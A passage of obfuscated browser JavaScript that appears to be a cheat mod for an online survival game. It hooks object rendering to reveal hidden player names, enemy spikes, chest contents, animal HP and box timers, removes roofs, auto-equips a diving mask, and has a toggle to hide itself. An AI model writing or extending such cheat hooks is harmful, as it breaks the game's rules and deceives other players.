                  a0LOADstring.lineCap = "round";
                  a0LOADstring.arc(0, 0, a0BALAncevalues * 12, 0, Math.PI * 2 * this.hoodTimerV);
                  a0LOADstring.stroke();
                  a0LOADstring.restore();
                }
              };
            }
            {
              let x = t[f];
              t[f] = function (e) {
                let t = () => {
                  if (a0JUMPfile.ShowHoodName.e && (this.clothe === a0CONNectloop.HOOD || this.clothe === a0CONNectloop.WINTER_HOOD) || a0JUMPfile.GhostInfo.e && this.ghost) {
                    a0LOADstring.save();
                    a0LOADstring.translate(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                    let e;
                    let t;
                    let i;
                    if (this.dist_winter > 0) {
                      this.player.label_winter ||= a0GRABtoken(a0BALAncevalues, this.player.nickname, 20, "#187484", "#000", 2, null, null, a0BALAncevalues * 300);
                      e = this.player.label_winter;
                    } else {
                      this.player.label ||= a0GRABtoken(a0BALAncevalues, this.player.nickname, 20, "#FFF", "#000", 2, null, null, a0BALAncevalues * 300);
                      e = this.player.label;
                    }
                    t = Math.floor(-e.width / 2);
                    i = Math.floor(-e.height / 2 - a0BALAncevalues * 70);
                    a0HASHload(a0LOADstring, e, t, i);
                    let $;
                    if (this.player.level > 0) {
                      $ = t + e.width + 5;
                      if (a0FETChuser[this.player.level] === undefined) {
                        a0FETChuser[this.player.level] = a0GRABtoken(a0BALAncevalues, "[" + this.player.level + "]", 20, "#F9E8A2", "#000", 2, null, null, a0BALAncevalues * 50);
                      }
                      a0HASHload(a0LOADstring, a0FETChuser[this.player.level], $, i);
                    }
                    a0LOADstring.restore();
                  }
                };
                if (a0JUMPfile.RenderOnTop.e && a0JUMPfile.RenderOnTop.player && !a0JUMPfile.HideScript.e) {
                  if (e) {
                    x.apply(this);
                    t();
                  }
                } else {
                  x.apply(this);
                  t();
                }
              };
            }
            Object.defineProperty(t, "draw", {
              get() {
                return this[f];
              }
            });
            if (!g) {
              let K = Object.keys(t).filter(e => typeof t[e] == "function");
              g = K[1];
              a0PROMptload.draw_vehicle = g;
            }
            {
              let w = t[g];
              t[g] = function (e) {
                if (a0JUMPfile.RenderOnTop.e && a0JUMPfile.RenderOnTop.player && !a0JUMPfile.HideScript.e) {
                  if (e) {
                    a0LOADstring.save();
                    let t = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(a0LOADstring), "globalAlpha");
                    a0LOADstring.globalAlpha = a0JUMPfile.VehicleOpacity;
                    Object.defineProperty(a0LOADstring, "globalAlpha", {
                      get: () => a0JUMPfile.VehicleOpacity,
                      set(e) { },
                      configurable: true
                    });
                    w.apply(this);
                    Object.defineProperty(a0LOADstring, "globalAlpha", t);
                    a0LOADstring.restore();
                  }
                } else {
                  a0LOADstring.save();
                  let i = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(a0LOADstring), "globalAlpha");
                  a0LOADstring.globalAlpha = a0JUMPfile.VehicleOpacity;
                  Object.defineProperty(a0LOADstring, "globalAlpha", {
                    get: () => a0JUMPfile.VehicleOpacity,
                    set(e) { },
                    configurable: true
                  });
                  w.apply(this);
                  Object.defineProperty(a0LOADstring, "globalAlpha", i);
                  a0LOADstring.restore();
                }
              };
            }
            Object.defineProperty(t, "draw_vehicle", {
              get() {
                return this[g];
              }
            });
            {
              let J;
              if (!I) {
                I = (J = Object.keys(t).filter(e => typeof t[e] == "number" && t[e] && t[e] === -1000000))[0];
                _ = J[2];
                S = J[3];
                a0KICKclock = J[5];
              }
              if (t.pid === USERTOFIX.id) {
                let z = Symbol("dist_water");
                t.dist_waterSymbol = t[a0KICKclock];
                Object.defineProperty(t, a0KICKclock, {
                  get() {
                    return this[z];
                  },
                  set(e) {
                    let t = a0CLONelog.fast_units[USERTOFIX.uid];
                    if (t && a0JUMPfile.AutoDiving.e && USERTOFIX.inv.n[a0CONNectloop.DIVING_MASK] && !t.vehicle && !a0DISPatchcommit[t.clothe] && !a0OPTImizedrive && !a0MINIfyvalues) {
                      let i = this[z];
                      if (e === 1 && i === undefined) {
                        if (a0COMPresssignal !== null && a0COMPresssignal !== a0CONNectloop.DIVING_MASK || a0COMPresssignal === null && t.clothe !== a0CONNectloop.DIVING_MASK) {
                          a0INVErtsignature = a0COMPresssignal !== null ? a0COMPresssignal : t.clothe;
                          if (USERTOFIX.craft.crafting) {
                            if (a0INVErtinput === null) {
                              a0INVErtinput = a0CONNectloop.DIVING_MASK;
                              a0HIGHlightqueue().then(() => {
                                if (a0COMPresssignal === null && t.clothe !== a0INVErtinput || a0COMPresssignal !== null && a0COMPresssignal !== a0INVErtinput) {
                                  a0HYDRatequeue(a0INVErtinput);
                                  a0COMPresssignal = a0INVErtinput;
                                }
                                a0INVErtinput = null;
                              });
                            } else {
                              a0INVErtinput = a0CONNectloop.DIVING_MASK;
                            }
                          } else {
                            a0HYDRatequeue(a0CONNectloop.DIVING_MASK);
                            a0COMPresssignal = a0CONNectloop.DIVING_MASK;
                          }
                        }
                      } else if (e === undefined && i === 1) {
                        if (a0INVErtsignature && a0INVErtsignature !== a0CONNectloop.DIVING_MASK) {
                          if (USERTOFIX.craft.crafting) {
                            if (a0INVErtinput === null) {
                              a0INVErtinput = a0INVErtsignature;
                              a0HIGHlightqueue().then(() => {
                                if (a0COMPresssignal === null && t.clothe !== a0INVErtinput || a0COMPresssignal !== null && a0COMPresssignal !== a0INVErtinput) {
                                  a0HYDRatequeue(a0INVErtinput);
                                  a0COMPresssignal = a0INVErtinput;
                                }
                                a0INVErtinput = null;
                              });
                            } else {
                              a0INVErtinput = a0INVErtsignature;
                            }
                          } else {
                            a0HYDRatequeue(a0INVErtsignature);
                            a0COMPresssignal = a0INVErtsignature;
                          }
                        }
                        a0INVErtsignature = null;
                      }
                    }
                    this[z] = e;
                  }
                });
              }
              Object.defineProperties(t, {
                dist_forest: {
                  get() {
                    return this[I];
                  }
                },
                dist_lava: {
                  get() {
                    return this[_];
                  }
                },
                dist_winter: {
                  get() {
                    return this[S];
                  }
                },
                dist_desert: {
                  get() {
                    return this[a0MINIfyspaces];
                  }
                },
                dist_water: {
                  get() {
                    return this[a0KICKclock];
                  }
                }
              });
            }
            t.pullHoodTime = performance.now() - (t.right === a0CONNectloop.WINTER_HOOD ? 8000 : 4000);
            t.hitedTime = t.pullHoodTime;
            {
              let F = t[h];
              t[h] = function (e) {
                let t = this.ghost;
                let i = this.right;
                let $ = this.clothe;
                F.apply(this, arguments);
                if (this.right !== i && a0INSErtform[this.right]) {
                  this.pullWeaponTime = performance.now();
                }
                if (this.clothe !== $ && (this.clothe === a0CONNectloop.HOOD || this.clothe === a0CONNectloop.WINTER_HOOD)) {
                  this.pullHoodTime = performance.now();
                }
                if (e & a0PROMptlog.ATTACK) {
                  this.startAttackTime = performance.now();
                  this.calcDamageTime = null;
                } else if (e & a0PROMptlog.COLD) {
                  if (this.dist_winter > 0) {
                    this.currentHp -= 40;
                  } else {
                    this.currentHp -= 20;
                  }
                } else if (e & a0PROMptlog.HEAL) {
                  if (this.clothe === a0CONNectloop.CROWN_OF_LIFE) {
                    this.currentHp += 56;
                  } else {
                    this.currentHp += 42;
                  }
                  this.currentHp = Math.min(200, this.currentHp);
                  this.lastHealTime = performance.now();
                } else if (e & a0PROMptlog.HUNGER) {
                  this.currentHp -= 40;
                } else if (e & a0PROMptlog.HURT) {
                  this.currentHp -= a0CREAtetask(this, a0FILTergroup(this));
                  this.hitedTime = performance.now();
                }
                if (this.ghost) {
                  if (60 - (performance.now() - this.spawnGhostTime) / 1000 < 0 || !this.spawnGhostTime) {
                    this.spawnGhostTime = performance.now();
                  }
                } else {
                  this.spawnGhostTime = null;
                  if (t) {
                    this.currentHp = this.maxHp;
                  }
                }
              };
            }
            if (USERTOFIX.id === t.pid) {
              let W = t[h];
              t[h] = function (e) {
                W.apply(this, arguments);
                if (a0PROCesshandler === this.right) {
                  a0PROCesshandler = null;
                }
                if (a0COMPresssignal === this.clothe) {
                  a0COMPresssignal = null;
                }
              };
            }
            break;
          case a0HOOKjob.SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let G = Object.keys(t);
              f = G.find(e => typeof t[e] == "function");
            }
            {
              let V = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return V.call(this, 10000);
                  } else {
                    return V.call(this, 10001);
                  }
                }
                V.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.STONE_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let Y = Object.keys(t);
              f = Y.find(e => typeof t[e] == "function");
            }
            {
              let X = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return X.call(this, 10002);
                  } else {
                    return X.call(this, 10003);
                  }
                }
                X.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.GOLD_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let q = Object.keys(t);
              f = q.find(e => typeof t[e] == "function");
            }
            {
              let Q = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return Q.call(this, 10004);
                  } else {
                    return Q.call(this, 10005);
                  }
                }
                Q.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.DIAMOND_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let Z = Object.keys(t);
              f = Z.find(e => typeof t[e] == "function");
              console.log(f);
            }
            {
              let ee = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return ee.call(this, 10006);
                  } else {
                    return ee.call(this, 10007);
                  }
                }
                ee.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.AMETHYST_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let ea = Object.keys(t);
              f = ea.find(e => typeof t[e] == "function");
              console.log(f);
            }
            {
              let et = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return et.call(this, 10008);
                  } else {
                    return et.call(this, 10009);
                  }
                }
                et.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.REIDITE_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let ei = Object.keys(t);
              f = ei.find(e => typeof t[e] == "function");
            }
            {
              let e$ = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return e$.call(this, 10010);
                  } else {
                    return e$.call(this, 10011);
                  }
                }
                e$.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.REIDITE_DOOR_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eo = Object.keys(t);
              f = eo.find(e => typeof t[e] == "function");
            }
            {
              let el = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return el.call(this, 10012);
                  } else {
                    return el.call(this, 10013);
                  }
                }
                el.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.AMETHYST_DOOR_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let en = Object.keys(t);
              f = en.find(e => typeof t[e] == "function");
            }
            {
              let es = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return es.call(this, 10014);
                  } else {
                    return es.call(this, 10015);
                  }
                }
                es.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.DIAMOND_DOOR_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let er = Object.keys(t);
              f = er.find(e => typeof t[e] == "function");
            }
            {
              let ec = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return ec.call(this, 10016);
                  } else {
                    return ec.call(this, 10017);
                  }
                }
                ec.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.GOLD_DOOR_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eO = Object.keys(t);
              f = eO.find(e => typeof t[e] == "function");
            }
            {
              let ep = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return ep.call(this, 10018);
                  } else {
                    return ep.call(this, 10019);
                  }
                }
                ep.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.STONE_DOOR_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eu = Object.keys(t);
              f = eu.find(e => typeof t[e] == "function");
            }
            {
              let eN = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return eN.call(this, 10020);
                  } else {
                    return eN.call(this, 10021);
                  }
                }
                eN.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.WOOD_DOOR_SPIKE:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eE = Object.keys(t);
              f = eE.find(e => typeof t[e] == "function");
            }
            {
              let ed = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return ed.call(this, 10022);
                  } else {
                    return ed.call(this, 10023);
                  }
                }
                ed.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.REIDITE_DOOR:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let ef = Object.keys(t);
              f = ef.find(e => typeof t[e] == "function");
            }
            {
              let eg = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return eg.call(this, 10024);
                  } else {
                    return eg.call(this, 10025);
                  }
                }
                eg.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.AMETHYST_DOOR:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eA = Object.keys(t);
              f = eA.find(e => typeof t[e] == "function");
            }
            {
              let eh = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return eh.call(this, 10026);
                  } else {
                    return eh.call(this, 10027);
                  }
                }
                eh.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.DIAMOND_DOOR:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eR = Object.keys(t);
              f = eR.find(e => typeof t[e] == "function");
            }
            {
              let eC = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return eC.call(this, 10028);
                  } else {
                    return eC.call(this, 10029);
                  }
                }
                eC.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.GOLD_DOOR:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let ey = Object.keys(t);
              f = ey.find(e => typeof t[e] == "function");
            }
            {
              let em = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return em.call(this, 10030);
                  } else {
                    return em.call(this, 10031);
                  }
                }
                em.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.STONE_DOOR:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eM = Object.keys(t);
              f = eM.find(e => typeof t[e] == "function");
            }
            {
              let eL = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return eL.call(this, 10032);
                  } else {
                    return eL.call(this, 10033);
                  }
                }
                eL.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.WOOD_DOOR:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let eP = Object.keys(t);
              f = eP.find(e => typeof t[e] == "function");
            }
            {
              let eD = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ColoredSpike.e && !(t.info & 1) && !a0JUMPfile.HideScript.e) {
                  if (t.ally) {
                    return eD.call(this, 10034);
                  } else {
                    return eD.call(this, 10035);
                  }
                }
                eD.apply(this, e);
              };
            }
            break;
          case a0HOOKjob.ROOF:
            t.j = Math.floor(t.x / 100);
            t.i = Math.floor(t.y / 100);
            {
              let eT = t[f];
              t[f] = function () {
                if (a0JUMPfile.Roof.e) {
                  a0FETChlist.apply(this, arguments);
                } else {
                  eT.apply(this, arguments);
                }
              };
            }
            break;
          case a0HOOKjob.CHEST:
            t.ally = USERTOFIX.id === t.pid || a0KEEPtext(t.pid);
            if (!f) {
              let e_ = Object.keys(t);
              f = e_.find(e => typeof t[e] == "function" && t[e].toString().replace(/\s+/g, "").includes(".save()"));
            }
            {
              let eI = t[f];
              t[f] = function (...e) {
                if (a0JUMPfile.ChestInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.save();
                  a0LOADstring.translate(USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                  a0LOADstring.rotate(this.angle);
                  let t;
                  let i = -(t = this.lock ? this.ally ? a0MINIfydata[10101][a0CLONelog.time] : a0MINIfydata[10102][a0CLONelog.time] : a0MINIfydata[10100][a0CLONelog.time]).width;
                  let $ = -t.height;
                  a0HASHload(a0LOADstring, t, -i / 2, -$ / 2, i, $);
                  a0LOADstring.restore();
                  if (this.action) {
                    a0LOADstring.save();
                    a0LOADstring.globalAlpha = 0.9;
                    a0HASHload(a0LOADstring, a0MINIfyresult.chest_buttons[this.action / 2 - 1].info.img[0], USERTOFIX.cam.x + this.x + 27, USERTOFIX.cam.y + this.y + 28, i + 25, i + 25);
                    a0LOADstring.globalAlpha = 1;
                    a0LOADstring.font = "20px Baloo Paaji";
                    a0LOADstring.strokeStyle = "black";
                    a0LOADstring.fillStyle = "white";
                    a0LOADstring.lineWidth = 6;
                    a0LOADstring.strokeText("x" + this.info, USERTOFIX.cam.x + this.x - 32, USERTOFIX.cam.y + this.y + 20);
                    a0LOADstring.fillText("x" + this.info, USERTOFIX.cam.x + this.x - 32, USERTOFIX.cam.y + this.y + 20);
                    if (a0JUMPfile.ChestInfo.isShowInvId) {
                      a0LOADstring.strokeText(this.action / 2 - 1, USERTOFIX.cam.x + this.x - 32, USERTOFIX.cam.y + this.y - 12);
                      a0LOADstring.fillText(this.action / 2 - 1, USERTOFIX.cam.x + this.x - 32, USERTOFIX.cam.y + this.y - 12);
                    }
                    a0LOADstring.restore();
                  }
                } else {
                  eI.apply(this, e);
                }
              };
            }
            break;
          case a0HOOKjob.FURNACE:
            let e8 = t[f];
            t[f] = function (...e) {
              e8.apply(this, e);
              if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                a0LOADstring.save();
                a0LOADstring.font = "22px Baloo Paaji";
                a0LOADstring.strokeStyle = "black";
                a0LOADstring.lineWidth = 7;
                a0LOADstring.strokeText("x" + this.info, USERTOFIX.cam.x + this.x - 15, USERTOFIX.cam.y + this.y);
                a0LOADstring.fillStyle = "white";
                a0LOADstring.fillText("x" + this.info, USERTOFIX.cam.x + this.x - 15, USERTOFIX.cam.y + this.y);
                a0LOADstring.restore();
              }
            };
            break;
          case a0HOOKjob.EMERALD_MACHINE:
            t.img = new a0DECOdeinput(200, 50, 0);
            t.img.drawText(String.raw`${a0CLONelog.players[t.pid].nickname}`, 18, "black", "white");
            {
              if (!A) {
                A = Object.keys(t).filter(e => typeof t[e] == "function" && t[e].length === 0)[1];
                a0PROMptload.draw_fgKey = A;
              }
              let eS = t[A];
              t[A] = function (...e) {
                eS.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 30, USERTOFIX.cam.y + this.y - 40);
                }
              };
            }
            break;
          case a0HOOKjob.BREAD_OVEN:
            t.img = new a0DECOdeinput(68, 90, 2);
            if (t.info) {
              t.img.drawText(t.info, 20, "black", "white");
            }
            t[h] = function () {
              if (this.info) {
                this.img.drawText(this.info, 20, "black", "white");
              }
            };
            {
              let ek = t[f];
              t[f] = function (...e) {
                ek.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 33, USERTOFIX.cam.y + this.y - 47);
                }
              };
            }
            break;
          case a0HOOKjob.EXTRACTOR_MACHINE_STONE:
            t.img = new a0DECOdeinput(70, 70, 1);
            if (t.info) {
              t.img.drawText(t.info, 20, "black", "white");
            }
            t[h] = function () {
              if (this.info) {
                this.img.drawText(this.info, 20, "black", "white");
              }
            };
            {
              let eb = t[f];
              t[f] = function (...e) {
                eb.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 30, USERTOFIX.cam.y + this.y - 40);
                }
              };
            }
            break;
          case a0HOOKjob.EXTRACTOR_MACHINE_GOLD:
            t.img = new a0DECOdeinput(70, 70, 1);
            if (t.info) {
              t.img.drawText(t.info, 20, "black", "white");
            }
            t[h] = function () {
              if (this.info) {
                this.img.drawText(this.info, 20, "black", "white");
              }
            };
            {
              let ev = t[f];
              t[f] = function (...e) {
                ev.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 30, USERTOFIX.cam.y + this.y - 40);
                }
              };
            }
            break;
          case a0HOOKjob.EXTRACTOR_MACHINE_DIAMOND:
            t.img = new a0DECOdeinput(70, 70, 1);
            if (t.info) {
              t.img.drawText(t.info, 20, "black", "white");
            }
            t[h] = function () {
              if (this.info) {
                this.img.drawText(this.info, 20, "black", "white");
              }
            };
            {
              let e0 = t[f];
              t[f] = function (...e) {
                e0.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 30, USERTOFIX.cam.y + this.y - 40);
                }
              };
            }
            break;
          case a0HOOKjob.EXTRACTOR_MACHINE_AMETHYST:
            t.img = new a0DECOdeinput(70, 70, 1);
            if (t.info) {
              t.img.drawText(t.info, 20, "black", "white");
            }
            t[h] = function () {
              if (this.info) {
                this.img.drawText(this.info, 20, "black", "white");
              }
            };
            {
              let eH = t[f];
              t[f] = function (...e) {
                eH.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 30, USERTOFIX.cam.y + this.y - 40);
                }
              };
            }
            break;
          case a0HOOKjob.EXTRACTOR_MACHINE_REIDITE:
            t.img = new a0DECOdeinput(70, 70, 1);
            if (t.info) {
              t.img.drawText(t.info, 20, "black", "white");
            }
            t[h] = function () {
              if (this.info) {
                this.img.drawText(this.info, 20, "black", "white");
              }
            };
            {
              let eU = t[f];
              t[f] = function (...e) {
                eU.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 30, USERTOFIX.cam.y + this.y - 40);
                }
              };
            }
            break;
          case a0HOOKjob.WINDMILL:
            t.img = new a0DECOdeinput(70, 70, 1);
            if (t.info) {
              t.img.drawText(t.info, 20, "black", "white");
            }
            t[h] = function () {
              if (this.info) {
                this.img.drawText(this.info, 20, "black", "white");
              }
            };
            {
              if (!A) {
                A = Object.keys(t).filter(e => typeof t[e] == "function" && t[e].length === 0)[1];
                a0PROMptload.draw_fgKey = A;
              }
              let e3 = t[A];
              t[A] = function (...e) {
                e3.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 30, USERTOFIX.cam.y + this.y - 40);
                }
              };
            }
            break;
          case a0HOOKjob.TOTEM:
            if (USERTOFIX.in_team(t.pid)) {
              a0HANDlelog = {
                x: t.x,
                y: t.y
              };
            }
            t.img = new a0DECOdeinput(200, 90, 3);
            t.img.drawText([String.raw`${a0CLONelog.players[t.pid].nickname}`, t.info], 18, "black", "white");
            t[h] = function () {
              this.img.drawText([String.raw`${a0CLONelog.players[this.pid].nickname}`, this.info], 18, "black", "white");
            };
            {
              let eB = t[f];
              t[f] = function (...e) {
                eB.apply(this, e);
                if (this.info && a0JUMPfile.WorldInfo.e && !a0JUMPfile.HideScript.e) {
                  a0LOADstring.drawImage(this.img.canvas, USERTOFIX.cam.x + this.x - 25, USERTOFIX.cam.y + this.y - 50);
                }
              };
            }
            break;
          case a0HOOKjob.CRATE:
          case a0HOOKjob.DEAD_BOX:
            if (!f) {
              let ej = Object.keys(t);
              f = ej.find(e => typeof t[e] == "function");
              a0PROMptload.draw = f;
            }
            {
              let ex = t[f];
              t[f] = function () {
                if ((!a0JUMPfile.RenderOnTop.e || !a0JUMPfile.RenderOnTop.box || a0JUMPfile.HideScript.e || arguments[2]) && (ex.apply(this, arguments), a0JUMPfile.BoxInfo.e && !a0JUMPfile.HideScript.e)) {
                  a0LOADstring.save();
                  a0LOADstring.font = "20px Baloo Paaji";
                  a0LOADstring.strokeStyle = "black";
                  a0LOADstring.textAlign = "center";
                  a0LOADstring.textBaseline = "middle";
                  a0LOADstring.lineWidth = 6;
                  let e;
                  let t;
                  if (this.type === a0HOOKjob.DEAD_BOX) {
                    if (this.isAnimalBox) {
                      t = "";
                      e = Math.floor(31 - (Date.now() - this.spawnTime) / 1000);
                    } else {
                      t = "Dead";
                      e = Math.floor(300 - (Date.now() - this.spawnTime) / 1000);
                    }
                  } else {
                    t = "Drop";
                    e = Math.floor(17 - (Date.now() - this.spawnTime) / 1000);
                  }
                  a0LOADstring.strokeText(t, USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                  a0LOADstring.strokeText(e + "s", USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y + 20);
                  a0LOADstring.fillStyle = "white";
                  a0LOADstring.fillText(t, USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                  a0LOADstring.fillText(e + "s", USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y + 20);
                  a0LOADstring.restore();
                }
              };
              Object.defineProperty(t, "draw", {
                get() {
                  return this[f];
                }
              });
            }
            break;
          case a0HOOKjob.TREASURE_CHEST:
            {
              let e1 = t[f];
              t[f] = function () {
                if (!a0JUMPfile.RenderOnTop.e || !a0JUMPfile.RenderOnTop.treasure_chest || a0JUMPfile.HideScript.e || arguments[2]) {
                  e1.apply(this, arguments);
                }
              };
              Object.defineProperty(t, "draw", {
                get() {
                  return this[f];
                }
              });
            }
        }
        if (a0FETChbuffer(t.type) || t.type === a0HOOKjob.CRATE || t.type === a0HOOKjob.DEAD_BOX) {
          t.maxHp = a0OVERridestate(t.type);
          t.currentHp = t.maxHp;
          let eK = t[h];
          if (t.type === a0HOOKjob.DEAD_BOX) {
            t[h] = function (e) {
              if (e === a0PROMptlog.HURT) {
                if (!a0INSTalltask && Date.now() - this.spawnTime < 100) {
                  this.maxHp = 0;
                  this.currentHp = this.maxHp;
                  this.isAnimalBox = true;
                }
                this.currentHp -= a0INSTalllevel(a0RELOadtimer(this, a0CLONelog.units[a0HOOKjob.PLAYERS]), true);
              }
              eK?.apply(this, arguments);
            };
          } else {
            t[h] = function (e) {
              if (e === a0PROMptlog.HURT) {
                this.currentHp -= a0INSTalllevel(a0RELOadtimer(this, a0CLONelog.units[a0HOOKjob.PLAYERS]), true);
              }
              eK?.apply(this, arguments);
            };
          }
        }
        if (a0FETChbuffer(t.type)) {
          let ew = t[f];
          t[f] = function () {
            ew.apply(this, arguments);
            if (!a0JUMPfile.HideScript.e) {
              if (a0JUMPfile.VisualHp.e && a0JUMPfile.VisualHp.animal && this.currentHp > 0) {
                a0LOADstring.save();
                a0LOADstring.font = "22px Baloo Paaji";
                a0LOADstring.strokeStyle = "black";
                a0LOADstring.fillStyle = "white";
                a0LOADstring.textAlign = "center";
                a0LOADstring.textBaseline = "middle";
                a0LOADstring.lineWidth = 6;
                a0LOADstring.strokeText(this.currentHp + "❤️", USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                a0LOADstring.fillText(this.currentHp + "❤️", USERTOFIX.cam.x + this.x, USERTOFIX.cam.y + this.y);
                a0LOADstring.restore();
              }
              if (a0JUMPfile.ShowMovement.e && a0JUMPfile.ShowMovement.animal) {
                a0LOADstring.save();
                a0LOADstring.lineWidth = 2.6;
                a0LOADstring.beginPath();
